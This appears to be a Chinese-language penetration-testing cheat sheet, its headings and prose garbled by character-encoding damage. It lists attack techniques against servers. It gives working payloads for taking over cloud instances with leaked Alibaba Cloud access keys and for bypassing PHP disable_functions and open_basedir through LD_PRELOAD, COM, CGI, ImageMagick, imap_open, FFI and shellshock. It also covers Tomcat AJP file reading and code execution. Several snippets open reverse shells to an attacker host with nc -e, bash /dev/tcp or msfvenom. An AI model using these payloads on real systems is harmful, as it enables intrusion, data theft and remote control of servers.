<h4 id="é˜¿é‡Œäº‘OSS-Keyåˆ©ç”¨"><a href="#é˜¿é‡Œäº‘OSS-Keyåˆ©ç”¨" class="headerlink" title="é˜¿é‡Œäº‘OSS Keyåˆ©ç”¨"></a>é˜¿é‡Œäº‘OSS Keyåˆ©ç”¨</h4><pre><code>åç¼–è¯‘appæ–‡ä»¶ï¼ŒæŸ¥æ‰¾å¯èƒ½ä¼šåŒ…å«oss keyçš„æ–‡ä»¶ï¼Œå¦‚JSã€‚
OSSAccessKeyã€AccessKeySecretä½¿ç”¨OSSæµè§ˆå™¨è®¿é—®ã€‚
ç¬¬ä¸‰æ–¹è¡Œäº‘ç®¡å®¶å¯ä¿®æ”¹ç³»ç»Ÿå¯†ç ã€‚
åå¼¹shell
From: https://xz.aliyun.com/t/8310
https://api.aliyun.com/#/?product=Ecs
æœç´¢æ¡†æœç´¢é€‰æ‹©CreateCommandæ¥åˆ›å»ºä¸€ä¸ªå‘½ä»¤
CommandContentå¡«å‘½ä»¤çš„base64ï¼ŒTypeå¡«RunShellScript
å‘½ä»¤echo &quot;bash -i &gt;&amp; /dev/tcp/ä½ çš„IP/ç«¯å£ 0&gt;&amp;1&quot;| base64
bash -i &gt;&amp; /dev/tcp/ä½ çš„IP/ç«¯å£ 0&gt;&amp;1
YmFzaCAtaSAmZ3Q7JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMCZndDsmMQ==
</code></pre>
<p><img src="./img/841.png" alt="image"></p>
<pre><code>å¡«å¥½ä»¥åç‚¹è°ƒè¯•SDK
ä¼šç›´æ¥ç»™ä½ èµ·ä¸€ä¸ªCloud shell
</code></pre>
<p><img src="./img/842.png" alt="image"></p>
<pre><code>å¹¶åˆ›å»ºä¸€ä¸ªCreateCommand.pyæ–‡ä»¶ï¼Œä½¿ç”¨viç¼–è¾‘
</code></pre>
<p><img src="./img/843.png" alt="image"></p>
<pre><code>å¡«accessKeyId,accessSecretä¿å­˜æ‰§è¡Œï¼Œå¹¶è®°å½•Commandid
</code></pre>
<p><img src="./img/844.png" alt="image"></p>
<pre><code>å†æ¬¡åœ¨æœç´¢æ¡†æœç´¢InvokeCommand
</code></pre>
<p><img src="./img/845.png" alt="image"></p>
<pre><code>Commandidå¡«ä¸Šé¢è¯·æ±‚çš„è¿”å›å€¼ï¼ŒInstanceIdå¡«è¡Œäº‘ç®¡å®¶æ˜¾ç¤ºçš„å®ä¾‹ID
</code></pre>
<p><img src="./img/846.png" alt="image"></p>
<pre><code>å¡«å¥½äº†ç‚¹è°ƒè¯•sdkç„¶åç¼–è¾‘æ–‡ä»¶æŠŠaccessKeyId accessSecretå¡«ä¸€ä¸‹ï¼Œæ‰§è¡Œ
</code></pre>
<p><img src="./img/847.png" alt="image"></p>
<pre><code>ç„¶åçœ‹ç›‘å¬çš„æœåŠ¡å™¨shellå·²ç»åå¼¹æˆåŠŸ
</code></pre>
<p><img src="./img/848.png" alt="image"></p>
<h4 id="Linuxç»•è¿‡disable-function"><a href="#Linuxç»•è¿‡disable-function" class="headerlink" title="Linuxç»•è¿‡disable_function"></a>Linuxç»•è¿‡disable_function</h4><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><pre><code>linuxç¯å¢ƒ
putenv()ã€mail()å¯ç”¨
https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD
http://192.168.0.107/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so
outpathæ˜¯å‘½ä»¤è¾“å‡ºä½ç½®ï¼ŒsopathæŒ‡å®šsoæ–‡ä»¶è·¯å¾„ã€‚
æˆ–
æ›¿æ¢phpæ–‡ä»¶ä¸­çš„mailä¸ºerror_log(&quot;a&quot;,1);
</code></pre>
<h5 id="php7-0-7-3-bypass"><a href="#php7-0-7-3-bypass" class="headerlink" title="php7.0-7.3 bypass"></a>php7.0-7.3 bypass</h5><pre><code>ç›´æ¥bypass
https://raw.githubusercontent.com/mm0r1/exploits/master/php7-gc-bypass/exploit.php
</code></pre>
<h5 id="windowsç³»ç»Ÿç»„ä»¶comç»•è¿‡"><a href="#windowsç³»ç»Ÿç»„ä»¶comç»•è¿‡" class="headerlink" title="windowsç³»ç»Ÿç»„ä»¶comç»•è¿‡"></a>windowsç³»ç»Ÿç»„ä»¶comç»•è¿‡</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$command</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$wsh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">COM</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'WScript.shell'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ç”Ÿæˆä¸€ä¸ªCOMå¯¹è±¡ã€€Shell.Applicationä¹Ÿèƒ½</span>
<span class="token variable">$exec</span> <span class="token operator">=</span> <span class="token variable">$wsh</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cmd /c"</span><span class="token operator">.</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤</span>
<span class="token variable">$stdout</span> <span class="token operator">=</span> <span class="token variable">$exec</span><span class="token operator">-></span><span class="token function">StdOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$stroutput</span> <span class="token operator">=</span> <span class="token variable">$stdout</span><span class="token operator">-></span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$stroutput</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="CGIå¯åŠ¨æ–¹å¼"><a href="#CGIå¯åŠ¨æ–¹å¼" class="headerlink" title="CGIå¯åŠ¨æ–¹å¼"></a>CGIå¯åŠ¨æ–¹å¼</h5><pre><code>phpinfoä¸­æœç´¢server apiæ˜¯cgiæˆ–è€…fastcgi
å¦‚æœæ˜¯cgiæ¨¡å¼:ä¸Šä¼ å¦‚ä¸‹htaccess
Options ExecCGI
AddHandler cgi-script .xx
windowså¹³å°
#!C:/Windows/System32/cmd.exe /c start calc.exe
1
linuxå¹³å°
#!/bin/bash
echo -ne &quot;Content-Type: text:html\n\n&quot;
whoami
å¦‚æœæ˜¯fast_cgiï¼Œä¸Šä¼ å¦‚ä¸‹htaccess
Options +ExecCGI
AddHandler fcgid-script .abc
FcgidWrapper &quot;C:/Windows/System32/cmd.exe /c start cmd.exe&quot; .abc
ä¸Šä¼ ä»»æ„æ–‡ä»¶.abc
ç›¸å¯¹è·¯å¾„
AddHandler fcgid-script .html
FcgidWrapper &quot;../../php/php7.3.4nts/php-cgi.exe&quot; .html

AddHandler fcgid-script .xx
FcgidWrapper &quot;../../../WWW/localhost/calc.exe&quot; .xx
</code></pre>
<h5 id="ImageMagickç»„ä»¶ç»•è¿‡"><a href="#ImageMagickç»„ä»¶ç»•è¿‡" class="headerlink" title="ImageMagickç»„ä»¶ç»•è¿‡"></a>ImageMagickç»„ä»¶ç»•è¿‡</h5><pre><code>imageMagick ç‰ˆæœ¬ v6.9.3-9 æˆ– v7.0.1-0
ç¬¬ä¸€ç§
</code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"Disable Functions: "</span> <span class="token operator">.</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'disable_functions'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token variable">$command</span> <span class="token operator">=</span> <span class="token constant">PHP_SAPI</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'cli'</span> <span class="token operator">?</span> <span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$command</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'id'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$exploit</span> <span class="token operator">=</span> <span class="token string heredoc-string"><span class="token delimiter symbol"><span class="token punctuation">&lt;&lt;&lt;</span>EOF</span>
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|<span class="token interpolation"><span class="token variable">$command</span></span>")'    //æ ¸å¿ƒ
pop graphic-context
<span class="token delimiter symbol">EOF<span class="token punctuation">;</span></span></span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"KKKK.mvg"</span><span class="token punctuation">,</span> <span class="token variable">$exploit</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$thumb</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$thumb</span><span class="token operator">-></span><span class="token function">readImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'KKKK.mvg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$thumb</span><span class="token operator">-></span><span class="token function">writeImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'KKKK.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$thumb</span><span class="token operator">-></span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$thumb</span><span class="token operator">-></span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"KKKK.mvg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"KKKK.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>ç¬¬äºŒç§
</code></pre>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> cmd <span class="token operator">=</span> <span class="token string">"nc -e /usr/bin/zsh 127.0.0.1 4444"</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">int</span> <span class="token function">fileno</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>ç¼–è¯‘
gcc -shared -fPIC imag.c -o imag.so
</code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'LD_PRELOAD=/var/www/html/imag.so'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$img</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/tmp/1.ps'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="å¸¸è§„å‡½æ•°ç»•è¿‡"><a href="#å¸¸è§„å‡½æ•°ç»•è¿‡" class="headerlink" title="å¸¸è§„å‡½æ•°ç»•è¿‡"></a>å¸¸è§„å‡½æ•°ç»•è¿‡</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
------------------------------------------------------
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
------------------------------------------------------
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
------------------------------------------------------
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
------------------------------------------------------
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$command</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span><span class="token variable">$command</span> <span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//fread($handle, 1024);</span>
<span class="token punctuation">&#125;</span>
<span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
-------------------------------------------------------
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$command</span><span class="token operator">=</span><span class="token string double-quoted-string">"ipconfig"</span><span class="token punctuation">;</span>
<span class="token variable">$descriptorspec</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$command</span> <span class="token punctuation">,</span><span class="token variable">$descriptorspec</span> <span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//fgets($pipes[1],1024);</span>
<span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h5><pre><code>å¼€å¯äº†pcntl æ‰©å±•ï¼Œå¹¶ä¸”php 4&gt;=4.2.0 , php5ï¼Œlinux
</code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pcntl_exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/tmp/test.sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'pcntl extension is not support!'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>test.sh
#!/bin/bash
nc -e /bin/bash 1.1.1.1 8888       #åå¼¹shell
</code></pre>
<h5 id="imap-openå‡½æ•°"><a href="#imap-openå‡½æ•°" class="headerlink" title="imap_openå‡½æ•°"></a>imap_openå‡½æ•°</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'imap_open'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no imap_open function!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$server</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"x -oProxyCommand=echo\t"</span> <span class="token operator">.</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">">/tmp/cmd_result"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"|base64\t-d|sh&#125;"</span><span class="token punctuation">;</span>
<span class="token function">imap_open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&#123;'</span> <span class="token operator">.</span> <span class="token variable">$server</span> <span class="token operator">.</span> <span class="token string single-quoted-string">':143/imap&#125;INBOX'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/tmp/cmd_result"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="php7-4-FFIç»•è¿‡"><a href="#php7-4-FFIç»•è¿‡" class="headerlink" title="php7.4 FFIç»•è¿‡"></a>php7.4 FFIç»•è¿‡</h5><pre><code>php 7.4
ffi.enable=true
</code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'nc -e /bin/bash ip 8888'</span><span class="token punctuation">;</span>
<span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span>
    <span class="token string double-quoted-string">"int system(char *command);"</span><span class="token punctuation">,</span>
    <span class="token string double-quoted-string">"libc.so.6"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ffi</span><span class="token operator">-></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h5><pre><code>å­˜åœ¨CVE-2014-6271æ¼æ´
PHP 5.*ï¼Œlinuxï¼Œputenv()ã€mail()å¯ç”¨
</code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PHP_LOL=() &#123; x; &#125;; <span class="token interpolation"><span class="token variable">$cmd</span></span> ><span class="token interpolation"><span class="token variable">$tmp</span></span> 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a@127.0.0.1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"-bv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$output</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"No output, or not vuln."</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="èšå‰‘æ’ä»¶"><a href="#èšå‰‘æ’ä»¶" class="headerlink" title="èšå‰‘æ’ä»¶"></a>èšå‰‘æ’ä»¶</h5><pre><code>01åˆ©ç”¨LD_PRELOADç¯å¢ƒå˜é‡
02åˆ©ç”¨ShellShockï¼ˆCVE-2014-6271ï¼‰
03åˆ©ç”¨Apache Mod CGI
04 PHP-FPMåˆ©ç”¨LD_PRELOADç¯å¢ƒå˜é‡ï¼ˆåŒ1ï¼‰
05æ”»å‡»PHP-FPMç›‘å¬ç«¯å£
06 Json Serializer UAF
07å…·æœ‰ç‰¹å®šææ„å‡½æ•°UAFçš„PHP7 GC
</code></pre>
<h4 id="open-basedirç»•è¿‡"><a href="#open-basedirç»•è¿‡" class="headerlink" title="open_basedirç»•è¿‡"></a>open_basedirç»•è¿‡</h4><pre><code>ç¬¬ä¸€ç§
http://x.com/shell.php?a=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;;
http://x.com/shell.php?a=if%20(%20$b%20=%20opendir(%22glob:///var/www/html/*.php%22)%20)%20&#123;while%20(%20($file%20=%20readdir($b))%20!==%20false%20)%20&#123;echo%20%22filename:%22.$file.%22\n%22;&#125;closedir($b);&#125;
ç¬¬äºŒç§
http://x.com/shell.php?a=ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);system(&#39;cat ../../../../../etc/passwd&#39;);
http://x.com/shell.php?a=mkdir(%22/tmp/crispr%22);chdir(%27/tmp/crispr/%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);print_r(scandir(%27.%27))
ç¬¬ä¸‰ç§
å‘½ä»¤æ‰§è¡Œç»•è¿‡
è¯»æ–‡ä»¶
?a=show_source(&#39;preload.php&#39;);
?a=echo(readfile(&#39;preload.php&#39;));
?a=print_r(readfile(&#39;preload.php&#39;));
?a=echo(file_get_contents(&#39;preload.php&#39;));
?a=print_r(file_get_contents(&#39;preload.php&#39;));
</code></pre>
<h4 id="Tomcat-Ajp-LFI-amp-RCE"><a href="#Tomcat-Ajp-LFI-amp-RCE" class="headerlink" title="Tomcat Ajp LFI&amp;RCE"></a>Tomcat Ajp LFI&amp;RCE</h4><pre><code>LFI
https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner
&gt;python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.0.110 -p 8009 -f pass
</code></pre>
<p><img src="./img/41.png" alt="image"></p>
<pre><code>RCE
&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.107 LPORT=12138 R &gt;/var/www/html/1.jpg
é…åˆç›®æ ‡æ–‡ä»¶ä¸Šä¼ ä¼ å…¥æœåŠ¡å™¨
</code></pre>
<p><img src="./img/42.png" alt="image"></p>
<pre><code>&gt;java -jar ajpfuzzer_v0.6.jar
&gt;connect 192.168.0.110 8009
&gt;forwardrequest 2 &quot;HTTP/1.1&quot; &quot;/index.jsp&quot; 192.168.0.107 192.168.0.107 porto 8009 false &quot;Cookie:AAAA=BBBB&quot;,&quot;Accept-Encoding:identity&quot; &quot;javax.servlet.include.request_uri:index.jsp&quot;,&quot;javax.servlet.include.path_info:/1.jpg&quot;,&quot;javax.servlet.include.servlet_path:/&quot;
</code></pre>
<p><img src="./img/43.png" alt="image"></p>
<h4 id="Mysqlè¿æ¥æ–‡ä»¶è¯»å–"><a href="#Mysqlè¿æ¥æ–‡ä»¶è¯»å–" class="headerlink" title="Mysqlè¿æ¥æ–‡ä»¶è¯»å–"></a>Mysqlè¿æ¥æ–‡ä»¶è¯»å–</h4><pre><code>https://github.com/Gifts/Rogue-MySql-Server
